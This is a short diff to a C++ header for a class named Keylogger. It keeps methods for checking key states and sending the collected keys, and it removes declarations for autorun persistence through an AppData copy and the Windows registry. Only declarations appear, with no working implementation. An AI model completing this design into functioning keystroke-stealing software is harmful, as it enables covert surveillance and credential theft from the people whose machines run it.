@@ -14,12 +14,8 @@ public:
     
 	void Run();
 	void Stop();
-    bool SetAutorun(bool autorun);
 
 private:
-    bool CopyTo(TCHAR* path);
-    bool SetAutorunAppdata(bool autorun);
-    bool SetAutorunRegistry(bool autorun);
 
     void CheckKey(short vkey, bool shift);
     void Send();
@@ -33,10 +29,6 @@ private:
 
     std::vector<const char*> keysPressed;
     bool keysActive[256 + 1];
-
-    TCHAR exeName[MAX_PATH];
-    TCHAR appDataPath[1024];
-    TCHAR registryPath[1024];
 };
 
 extern Keylogger keylogger;
